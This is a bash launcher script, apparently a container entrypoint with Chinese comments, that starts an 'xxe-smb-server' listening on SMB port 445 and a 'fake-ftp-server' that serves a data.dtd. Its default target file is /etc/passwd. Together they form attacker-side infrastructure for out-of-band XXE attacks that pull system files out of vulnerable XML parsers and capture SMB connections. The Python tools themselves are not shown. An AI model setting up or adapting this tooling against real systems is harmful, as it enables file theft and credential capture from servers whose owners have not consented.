#!/usr/bin/env bash
set -e

# xxe-smb-server.py 参数映射
XXE_SMB_PUBLIC_IP="${XXE_SMB_PUBLIC_IP:-127.0.0.1}"    # public_ip
XXE_SMB_WEB_PORT="${XXE_SMB_WEB_PORT:-8088}"             # webport
XXE_SMB_SHARE_PATH="${XXE_SMB_SHARE_PATH:-/tmp/share}" # -s/--share-path

# fake-ftp-server.py 参数映射（原 1.py）
XXE_FTP_PUBLIC_IP="${XXE_FTP_PUBLIC_IP:-127.0.0.1}"    # fake-ftp-server public_ip
FAKE_FTP_PORT="${FAKE_FTP_PORT:-2121}"                 # <port>
FAKE_FTP_LOG_FILE="${FAKE_FTP_LOG_FILE:-}"             # [output_file]，可为空
FAKE_FTP_HTTP_PORT="${FAKE_FTP_HTTP_PORT:-8087}"       # HTTP 端口 (用于提供 data.dtd)
FAKE_FTP_FILE_PATH="${FAKE_FTP_FILE_PATH:-/etc/passwd}" # 目标文件路径

echo "[*] Configurations:"
echo "    XXE_SMB_PUBLIC_IP   = ${XXE_SMB_PUBLIC_IP}"
echo "    XXE_SMB_WEB_PORT    = ${XXE_SMB_WEB_PORT}"
echo "    XXE_SMB_SHARE_PATH  = ${XXE_SMB_SHARE_PATH}"
echo "    XXE_FTP_PUBLIC_IP   = ${XXE_FTP_PUBLIC_IP}"
echo "    FAKE_FTP_PORT       = ${FAKE_FTP_PORT}"
echo "    FAKE_FTP_LOG_FILE   = ${FAKE_FTP_LOG_FILE:-<none>}"
echo "    FAKE_FTP_HTTP_PORT  = ${FAKE_FTP_HTTP_PORT}"
echo "    FAKE_FTP_FILE_PATH  = ${FAKE_FTP_FILE_PATH}"

# 创建 SMB 共享目录
mkdir -p "${XXE_SMB_SHARE_PATH}"

# 日志文件目录（如有配置）
if [ -n "${FAKE_FTP_LOG_FILE}" ]; then
  mkdir -p "$(dirname "${FAKE_FTP_LOG_FILE}")"
  touch "${FAKE_FTP_LOG_FILE}"
fi

########################################
# 启动 xxe-smb-server
########################################
echo "[*] Starting xxe-smb-server (HTTP:${XXE_SMB_WEB_PORT}, SMB:445) ..."

python3 /app/xxe-smb-server/xxe-smb-server.py \
  "${XXE_SMB_PUBLIC_IP}" \
  "${XXE_SMB_WEB_PORT}" \
  -s "${XXE_SMB_SHARE_PATH}" &
PID_XXE_SMB=$!

########################################
# 启动 fake-ftp-server (fake-ftp-server.py)
########################################
echo "[*] Starting fake-ftp-server (fake-ftp-server.py) ..."

# 构建命令行参数
FTP_CMD="python3 /app/fake-ftp-server/fake-ftp-server.py ${FAKE_FTP_PORT}"
FTP_CMD="${FTP_CMD} --ip ${XXE_FTP_PUBLIC_IP}"
FTP_CMD="${FTP_CMD} --http-port ${FAKE_FTP_HTTP_PORT}"
FTP_CMD="${FTP_CMD} --file ${FAKE_FTP_FILE_PATH}"

if [ -n "${FAKE_FTP_LOG_FILE}" ]; then
  FTP_CMD="${FTP_CMD} --output ${FAKE_FTP_LOG_FILE}"
fi

${FTP_CMD} &
PID_FAKE_FTP=$!

########################################
# 等待任一子进程退出
########################################
echo "[*] All services started. PIDs: xxe-smb=${PID_XXE_SMB}, fake-ftp=${PID_FAKE_FTP}"
wait -n "${PID_XXE_SMB}" "${PID_FAKE_FTP}"
exit $?
